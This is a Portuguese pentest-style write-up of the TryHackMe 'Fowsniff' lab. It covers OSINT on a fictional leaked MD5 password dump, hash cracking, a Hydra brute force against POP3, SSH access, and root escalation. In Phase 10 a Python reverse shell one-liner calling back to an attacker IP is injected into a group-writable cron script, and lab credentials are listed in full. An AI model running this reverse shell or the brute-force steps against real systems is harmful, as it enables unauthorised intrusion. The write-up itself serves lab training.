# 🐦 Fowsniff — CTF Writeup
### TryHackMe | Boot-to-Root | OSINT (Twitter/Pastebin) · MD5 Cracking · POP3 Brute Force · Cron Group-Writable Script

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 20/08/2026                                                                             |
| **Data do Pentest**   | 20/08/2026 · 22:17 – 22:38 (GMT+0000)                                                  |
| **Alvo**              | `10.67.166.150` (`fowsniff`)  — TryHackMe · Fowsniff                                   |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Navegador (OSINT: Twitter/X, Pastebin) · CrackStation · Hydra 9.7 · Cliente POP3 · SSH · Nano · Python3 (reverse shell) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Fowsniff** (TryHackMe), um cenário inspirado em um incidente real de segurança envolvendo a fictícia **FowSniff Corp**. A cadeia de ataque foi conduzida quase inteiramente através de **OSINT** e **engenharia reversa de um vazamento de dados público**: o reconhecimento de rede via **Nmap** identificou os serviços SSH, HTTP, POP3 e IMAP; a página institucional da empresa confirmou publicamente um vazamento de credenciais de funcionários e o sequestro de sua conta oficial no **Twitter/X**; a conta sequestrada continha um tweet fixado apontando para um **Pastebin** com um **dump de 9 pares usuário/hash MD5** de contas de e-mail corporativas; os hashes MD5 foram quebrados via **CrackStation**, revelando as senhas em texto claro de todos os usuários; essas credenciais foram então utilizadas em um ataque de **força bruta direcionado com Hydra** contra o serviço **POP3**, confirmando a validade da senha do usuário `seina`; o acesso à caixa de e-mail via POP3 revelou um comunicado interno urgente contendo a **senha temporária de SSH** do servidor isolado pós-incidente; o acesso SSH como o usuário `baksteen` permitiu a enumeração de arquivos com permissões de grupo inseguras, revelando um script (`cube.sh`) executado periodicamente com privilégios de **root**, porém **gravável pelo grupo `users`**; a injeção de uma reverse shell em Python nesse script resultou em uma shell **root** completa e na captura da flag final.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-sV -sC -Pn -T4`)          |
| **Navegador Web (OSINT)**       | -       | Reconhecimento do site institucional, conta sequestrada no Twitter/X e Pastebin público  |
| **CrackStation**                | -       | Quebra offline dos hashes MD5 vazados dos e-mails corporativos                          |
| **Hydra**                       | 9.7     | Ataque de força bruta direcionado contra o serviço POP3, usando listas customizadas      |
| **Cliente POP3**                | -       | Leitura da caixa de correio comprometida (`RETR`)                                       |
| **SSH**                         | -       | Acesso inicial autenticado com a senha temporária vazada por e-mail                     |
| **Nano + Python3**              | -       | Injeção de reverse shell em script executado periodicamente com privilégios de root      |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **22:17 GMT · Nmap 7.99**

```bash
sudo nmap -sV -sC -Pn -T4 10.67.166.150
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA USER TOP RESP-CODES SASL(PLAIN) AUTH-RESP-CODE PIPELINING UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: more AUTH=PLAINA0001 ID have Pre-login SASL-IR LITERAL+ LOGIN-REFERRALS post-login IMAP4rev1 listed capabilities OK ENABLE IDLE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds
```

![Nmap](/CTFs/Fowsniff/images/Nmap_Scan.png)
Quatro serviços expostos: **SSH** (22), **HTTP** (80, "Fowsniff Corp - Delivering Solutions"), **POP3** (110, Dovecot) e **IMAP** (143, Dovecot) — a presença de dois serviços de e-mail (POP3/IMAP) já sinalizou que credenciais de contas de e-mail seriam centrais nesta máquina.

---

### FASE 2 — Reconhecimento do Site: Comunicado Público de Vazamento

Ao acessar `http://10.67.166.150/`, um comunicado institucional revelou publicamente detalhes de um incidente de segurança real sofrido pela empresa:

```
Fowsniff's internal system suffered a data breach that resulted in the
exposure of employee usernames and passwords.

Client information was not affected.

Due to the strong possibility that employee information has been made
publicly available, all employees have been instructed to change their
passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp
Twitter account. All of our official tweets have been deleted and the
attackers may release sensitive information via this medium. We are
working to resolve this as soon as possible.

We will return to full capacity after a service upgrade.
```

![Commentary](/CTFs/Fowsniff/images/Comentary.png)
> 🚨 **A própria empresa confirmou publicamente: vazamento de credenciais de funcionários + sequestro da conta oficial no Twitter/X.**

---

### FASE 3 — OSINT: Conta do Twitter/X Sequestrada

Seguindo a pista do comunicado, a conta **@FowSniffCorp** no Twitter/X foi localizada, exibindo claramente sinais de comprometimento (avatar alterado para um personagem hacker, nome de exibição "FowSniffCorp Pwned!"):

```
FowSniffCorp Pwned!
For more information, see the explanation - pastebin.com/378rLnGi

Pinned:
FowSniffCorp Pwned! · Mar 9, 2018
"lol gr8 security @fowsniffcorp - too bad I'm dumping all your passwords!
pastebin.com/NrAqVeeX"
```

![Twitter](/CTFs/Fowsniff/images/Dump_of_Credentials.png)
> ✅ **Pista de OSINT: o tweet fixado da conta sequestrada aponta para um Pastebin contendo o vazamento completo de credenciais.**

---

### FASE 4 — Vazamento de Credenciais: Dump de Hashes MD5

O link do Pastebin (`pastebin.com/NrAqVeeX`) revelou o dump completo, assinado pelo autor do ataque (`B1gN1nj4`):

```
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was
too lazy haha =P

18r n00bz!
B1gN1nj4
```

![Dump Pass](/CTFs/Fowsniff/images/Credentials_Dumpt_Passwd.png)
> ✅ **9 pares usuário/hash MD5 de contas de e-mail corporativas vazados publicamente, com o próprio invasor confirmando a exposição do serviço POP3.**

---

### FASE 5 — Quebra dos Hashes MD5 (CrackStation)

Cada um dos nove hashes foi submetido individualmente ao **CrackStation**, um serviço de quebra baseado em tabelas de busca pré-computadas, resultando na recuperação de **todas as senhas em texto claro**:

| Usuário     | Hash MD5                              | Senha em Texto Claro |
|-------------|----------------------------------------|-----------------------|
| `mauer`     | `8a28a94a588a95b80163709ab4313aa4`     | `mailcall`            |
| `mustikka`  | `ae1644dac5b77c0cf51e0d26ad6d7e56`     | `bilbo101`             |
| `tegel`     | `1dc352435fecca338acfd4be10984009`     | `apples01`             |
| `baksteen`  | `19f5af754c31f1e2651edde9250d69bb`     | `skyler22`             |
| `seina`     | `90dc16d47114aa13671c697fd506cf26`     | `scoobydoo2`           |
| `stone`     | `a92b8a29ef1183192e3d35187e0cfabd`     | `symphony`             |
| `mursten`   | `0e9588cb62f4b6f27e33d449e2ba0b3b`     | `carp4ever`            |
| `parede`    | `4d6e42f56e127803285a0a7649b5ab11`     | `orlando12`            |
| `sciana`    | `f7fd98d380735e859f8b2ffbbede5a7e`     | `07011972`             |

```
Hash: f7fd98d380735e859f8b2ffbbede5a7e
Type: md5
Result: 07011972
```

![MD5 Crack](/CTFs/Fowsniff/images/Pass_MD5_Emails.png)
> ✅ **Todas as 9 senhas de e-mail recuperadas em texto claro**, organizadas em duas listas (`Users.txt` e `Password.txt`) para uso na fase seguinte.

---

### FASE 6 — Força Bruta Direcionada contra o POP3 (Hydra)

Com listas de **usuários** e **senhas já conhecidas** (em vez de wordlists genéricas), um ataque de força bruta direcionado foi executado contra o serviço POP3 com **Hydra**, validando qual combinação usuário/senha realmente concedia acesso ao servidor:

```bash
hydra -L Projects/Fowsniff/Users.txt -P Projects/Fowsniff/Password.txt 10.67.166.150 pop3
```

```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:9/p:9), ~6 tries per task
[DATA] attacking pop3://10.67.166.150:110/
[110][pop3] host: 10.67.166.150   login: seina   password: scoobydoo2
1 of 1 target successfully completed, 1 valid password found
```

![Hydra POP3](/CTFs/Fowsniff/images/Hydra_BruteForce_POP3.png)
> ✅ **Credencial POP3 válida confirmada: `seina : scoobydoo2`**

---

### FASE 7 — Acesso à Caixa de Correio via POP3: Senha Temporária de SSH

Com a credencial válida, a caixa de correio de `seina` foi acessada diretamente via protocolo POP3, revelando um e-mail crítico enviado por `stone` (aparentemente um administrador) a todos os funcionários:

```
RETR 1
+OK 1622 octets
From: stone@fowsniff (stone)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff, mustikka@fowsniff,
    parede@fowsniff, sciana@fowsniff, seina@fowsniff, tegel@fowsniff
Subject: URGENT! Security EVENT!

Dear All,

A few days ago, a malicious actor was able to gain entry to our
internal email systems. The attacker was able to exploit incorrectly
filtered escape characters within our SQL database to access our login
credentials. Both the SQL and authentication system used legacy
methods that had not been updated in some time.

We have been instructed to perform a complete internal system overhaul.
While the main systems are "in the shop," we have moved to this
isolated, temporary server that has minimal functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not to
the world wide web. You can, however, access this system via the SSH
protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so
under my guidance. I saw the leak the attacker posted online, and I
must say that your passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.
```

![SSH Pass](/CTFs/Fowsniff/images/SSH_Pass.png)
> 🚨 **Vazamento crítico: o e-mail interno revelou a senha temporária de SSH (`S1ck3nBluff+secureshell`) do servidor isolado pós-incidente, além de confirmar que a causa raiz do vazamento original foi uma injeção SQL.**

---

### FASE 8 — Acesso Inicial via SSH

Com a senha temporária em mãos, o acesso SSH foi estabelecido utilizando o usuário `baksteen`:

```bash
ssh baksteen@10.67.166.150
```

```
**** Welcome to the Fowsniff Corporate Server! ****

——————— NOTICE: ———————
* Due to the recent security breach, we are running on a very minimal system.
* Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.

baksteen@fowsniff:~$ ls
Maildir  term.txt

baksteen@fowsniff:~$ cat term.txt
I wonder if the person who coined the term "One Hit Wonder" came up
with another other phrases.
```

![SSH](/CTFs/Fowsniff/images/SSH_Entry.png)
> 🚩 **Acesso inicial obtido — shell SSH como `baksteen`**

---

### FASE 9 — Enumeração de Escalada de Privilégios

Uma verificação inicial de permissões `sudo` não revelou nenhum caminho direto:

```bash
sudo -l
```

```
Sorry, user baksteen may not run sudo on fowsniff.
```

A busca prosseguiu por arquivos graváveis por grupo ou por qualquer usuário, focando especificamente nos grupos aos quais `baksteen` pertence:

```bash
find /etc/update-motd.d/ -type f \( -perm -020 -o -perm -002 \) -ls
find / -group users -type f 2>/dev/null
```

```
/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
...
```

O resultado destacou o arquivo **`/opt/cube/cube.sh`**, pertencente ao grupo `users` — o mesmo grupo secundário de `baksteen`:

```bash
ls -l /opt/cube/cube.sh
```

```
-rw-rwxr-- 1 parede users 851 Mar 11 2018 cube.sh
```

![Enum](/CTFs/Fowsniff/images/Privesc_Enum.png)
> 🚨 **Vulnerabilidade identificada: o script `cube.sh`, de propriedade do usuário `parede`, possui permissão de **escrita para o grupo `users`** — grupo ao qual `baksteen` pertence, permitindo a modificação de um script provavelmente executado periodicamente por uma tarefa agendada (cron).**

---

### FASE 10 — Exploração: Injeção de Reverse Shell no Script Cron

O conteúdo original do script foi inspecionado, revelando apenas um banner ASCII decorativo:

```bash
cat cube.sh
```

```bash
printf "
        :sdddddddddddddddy+  |‾‾‾‾| /‾‾|_|‾/‾|
     :yNMMMMMMMMMMMMMMNmhsso | _(‾)\ V V /_\ ...
.sdmmmmmNmmmmmmmNdyssssso    ...
                              Delivering Solutions\n\n"
```

Explorando a permissão de escrita do grupo, o script foi editado com **nano**, adicionando uma reverse shell em Python ao final do arquivo:

```bash
nano cube.sh
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.157.47",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

Com o payload salvo e um listener aguardando na máquina atacante, bastou aguardar a execução periódica do script pela tarefa agendada correspondente — que, dada a propriedade e o contexto de execução do `cron`, disparou o payload com **privilégios de root**.

[Privesc](/CTFs/Fowsniff/images/Privesc_Method.png)
> 🚩 **Escalada de privilégios bem-sucedida — reverse shell recebida com privilégios de `root`, através da execução automatizada e não supervisionada do script `cube.sh`.**

---

### FASE 11 — Captura da Flag Final (Root)

Com a shell reversa recebida e estabilizada, o contexto de privilégio foi imediatamente confirmado:

```bash
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root
ls
```

```
Maildir  flag.txt
```

```bash
cat flag.txt
```

```
   ______     ...     ______
  |  (_/ _) \`.v.\`.(_)  |_|(_)‾/
   \__\_/|_|\_,|\|\_,_\_|__\_/|(_)
              ()

          ┌─────────────────┐
          │   R O O T       │
          │   F L A G       │
          └─────────────────┘

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

![Root Flag](/CTFs/Fowsniff/images/Root_Flag.png)
> 🚩 **Comprometimento total confirmado — shell root obtida e flag final capturada em `/root/flag.txt`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[22:17 GMT] FASE 1 — RECONHECIMENTO (Nmap)
    22/SSH · 80/HTTP · 110/POP3 · 143/IMAP
    ↓
[FASE 2] SITE INSTITUCIONAL
    Comunicado público de vazamento + sequestro do Twitter/X
    ↓
[FASE 3] OSINT — TWITTER/X
    Conta @FowSniffCorp sequestrada → link para Pastebin
    ↓
[FASE 4] VAZAMENTO DE CREDENCIAIS (Pastebin)
    9 pares usuário/hash MD5 de e-mails corporativos
    ↓
[FASE 5] QUEBRA DOS HASHES (CrackStation)
    9 senhas em texto claro recuperadas
    ↓
[22:37-22:38 GMT] FASE 6 — FORÇA BRUTA DIRECIONADA (Hydra / POP3)
    seina : scoobydoo2 confirmado
    ↓
[FASE 7] LEITURA DA CAIXA POP3
    E-mail interno revela senha temporária de SSH
    ↓
[FASE 8] ACESSO INICIAL (SSH)
    ssh baksteen@10.67.166.150 (S1ck3nBluff+secureshell)
    ↓
[FASE 9] ENUMERAÇÃO DE PRIVESC
    /opt/cube/cube.sh — gravável pelo grupo "users"
    ↓
[FASE 10] EXPLORAÇÃO
    Reverse shell Python injetada via cron
    ↓
[FASE 11] FLAG FINAL (ROOT)
    id → uid=0(root) · flag.txt capturada
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso total como root
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap | SSH, HTTP, POP3, IMAP expostos — host `fowsniff` |
| Reconhecimento do Site | Navegação manual | Comunicado público confirmando vazamento e sequestro do Twitter |
| OSINT | Twitter/X | Conta `@FowSniffCorp` sequestrada, link para Pastebin |
| Vazamento de Credenciais | Pastebin | 9 pares usuário/hash MD5 de e-mails corporativos |
| Quebra de Hashes | CrackStation | 9 senhas em texto claro recuperadas |
| Força Bruta Direcionada | Hydra (POP3) | Credencial válida: `seina : scoobydoo2` |
| Acesso à Caixa de E-mail | Cliente POP3 (`RETR`) | E-mail interno revela senha temporária de SSH |
| Acesso Inicial | SSH | Login como `baksteen` |
| Enumeração de Privesc | `find -group users` | `/opt/cube/cube.sh` gravável pelo grupo `users` |
| Escalada de Privilégios | Reverse shell via cron | Shell root obtida |
| Flag Final | `cat flag.txt` | `/root/flag.txt` — comprometimento confirmado |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.166.150` (`fowsniff`) | Máquina Fowsniff (TryHackMe) — Ubuntu Linux |
| Serviços expostos | `22/SSH` · `80/HTTP` · `110/POP3` · `143/IMAP` | Superfície de ataque total |
| Vazamento público | Comunicado institucional + Twitter/X sequestrado | Confirma o incidente publicamente |
| Fonte do dump | `pastebin.com/NrAqVeeX` | 9 pares usuário/hash MD5 |
| Credenciais recuperadas | `mauer`, `mustikka`, `tegel`, `baksteen`, `seina`, `stone`, `mursten`, `parede`, `sciana` | Todas quebradas via CrackStation (MD5) |
| Credencial POP3 válida | `seina : scoobydoo2` | Confirmada via Hydra |
| Informação vazada por e-mail | Senha temporária de SSH: `S1ck3nBluff+secureshell` | Enviada em e-mail interno de `stone` |
| Causa raiz do incidente original | Injeção SQL (caracteres de escape mal filtrados) | Mencionada no e-mail interno |
| Usuário do acesso inicial | `baksteen` | Acesso via SSH com a senha vazada |
| Vetor de escalada de privilégios | `/opt/cube/cube.sh` (grupo `users`, gravável) | Script executado periodicamente com privilégios de root |
| Técnica de exploração | Reverse shell Python injetada em script cron | `python3 -c 'import socket,subprocess,os;...'` |
| Flag | `flag.txt` (ASCII art de conclusão) | `/root/flag.txt` |
| Técnica (MITRE ATT&CK) | `T1593` | Search Open Websites/Domains (OSINT via Twitter/Pastebin) |
| Técnica (MITRE ATT&CK) | `T1110.001` | Brute Force: Password Guessing (Hydra contra POP3) |
| Técnica (MITRE ATT&CK) | `T1114.002` | Email Collection: Remote Email Collection (POP3) |
| Técnica (MITRE ATT&CK) | `T1053.003` | Scheduled Task/Job: Cron (script gravável explorado) |

---

## ✅ Resumo da Flag

| # | Flag | Localização | Contexto |
|---|------|--------------|----------|
| 🚩 Flag | `flag.txt` (ASCII art de conclusão) | `/root/flag.txt` | Obtida após escalada de privilégios via `/opt/cube/cube.sh` |

---

## 📚 Referências

- [TryHackMe — Fowsniff](https://tryhackme.com/room/fowsniff)
- [CrackStation — Free Password Hash Cracker](https://crackstation.net/)
- [GitHub — vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- [MITRE ATT&CK T1593 — Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593/)
- [MITRE ATT&CK T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK T1114.002 — Remote Email Collection](https://attack.mitre.org/techniques/T1114/002/)
- [MITRE ATT&CK T1053.003 — Cron](https://attack.mitre.org/techniques/T1053/003/)

---